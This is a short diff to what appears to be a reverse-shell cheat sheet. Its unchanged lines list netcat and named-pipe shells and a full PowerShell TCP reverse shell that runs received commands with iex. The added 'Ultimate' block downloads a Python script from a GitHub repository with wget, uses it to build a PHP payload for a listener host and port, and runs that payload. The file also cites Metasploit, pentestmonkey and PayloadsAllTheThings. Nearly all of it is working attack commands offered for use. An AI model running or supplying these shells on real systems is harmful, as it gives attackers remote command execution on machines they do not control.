@@ -16,8 +16,17 @@ nc -e /bin/bash host port
 rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc host port >/tmp/f
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('host',port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
+Ultimate :
+```bash
+rm /tmp/revgen.py
+wget -O /tmp/revgen.py https://raw.githubusercontent.com/evilcater/H4cX/master/Tools/auto_reverse_shell/autorev.py
+rm /tmp/realexploit.php
+python3 /tmp/revgen.py {lhost} {lport} realexploit.php
+php -f /tmp/realexploit.php
+```
 
 Ressoure: 
+-me
 -metasploit
 -pentestmonkey
 -payloadallthethings
